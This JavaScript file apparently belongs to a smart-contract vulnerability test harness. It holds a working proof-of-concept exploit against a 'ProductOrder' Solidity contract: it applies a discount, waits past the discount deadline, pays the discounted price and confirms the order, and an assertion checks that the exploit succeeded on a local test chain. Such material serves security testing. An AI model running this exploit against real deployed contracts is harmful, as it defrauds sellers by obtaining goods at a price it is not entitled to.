require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
let logger = require('@lib/logging/logger');



// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'ProductOrder.sol'), 'utf8');

/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */

async function exploit(web3, envInfo, contractAddress) {
    try {        
        // Compile the contract to get ABI
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, 'ProductOrder', solcVersion);
        // Load the deployed contract
        let contractInstance = await new web3.eth.Contract(abi, contractAddress);

        // Step 1: Apply the discount just before the discountEndTime
        let step1Receipt = await contractInstance.methods.applyDiscount().send({ 
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000 
        });

        if (step1Receipt.status) {
            logger.debug(chalk.white("Step 1 transaction was successful!"));
            logger.debug(chalk.white("Waiting for 7 seconds to bypass the deadline for product discount..."));
            
            // Wait for 7 seconds
            await sleep(7000);

            // Step 2: Get the discounted price and make a transaction to "payForOrder" function
            let discountedPrice = await contractInstance.methods.price().call();
            let step2Receipt = await contractInstance.methods.payForOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                value: discountedPrice, // Sending the discounted price as payment
                gas: 3000000
            });
            
            if (step2Receipt.status) {
                logger.debug(chalk.white("Step 2 transaction was successful!"));
                
                // Wait for 3 seconds
                await sleep(3000);

                // Step 3: Execute confirmOrder function with no Ether value sent or params
                let step3Receipt = await contractInstance.methods.confirmOrder().send({
                    from: web3.eth.accounts.wallet[0].address,
                    gas: 3000000
                });

                if (step3Receipt.status) {
                    logger.debug(chalk.white("Step 3 transaction was successful!"));
                    return true;
                } else { 
                    logger.debug(chalk.red("Step 3 transaction failed!"));
                    return false;
                }
            } else {
                logger.error("Step 2 transaction failed!");
                return false;
            }
            
        } else {
            logger.error("Step 1 transaction failed!");
            return false; 
        }
    } catch (error) {
        logger.error(error.stack);
        return false;
    }
}


/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    console.log(chalk.blue(`result of running the exploit is: ${result}`));
    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
